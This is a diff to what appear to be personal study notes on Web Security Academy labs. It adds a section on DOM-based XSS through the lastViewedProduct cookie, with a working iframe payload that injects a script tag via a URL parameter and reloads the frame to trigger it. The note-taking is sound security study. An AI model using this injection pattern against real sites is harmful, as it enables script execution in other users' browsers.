@@ -54,3 +54,12 @@ https://0ac700710410da51818e07ba00f3006b.web-security-academy.net/post?postId=10
 ```
 
 Mitigation: use strict validation against a whitelist of URLs
+
+## DOM XSS with cookie manipulation
+The page uses a cookie called lastViewedProduct whose value is the last product url visited.
+We can stage an exploit where we initially navigatre to a product page and append some malicious javascript to the url.
+This URL is saved in the cookie. Then when we call the onload and are redirected to the home page, the cookie loads the javascript.
+
+```
+<iframe src="https://0a56007f0348ed7b801b8f5b004d002f.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://0a56007f0348ed7b801b8f5b004d002f.web-security-academy.net';window.x=1;">
+```
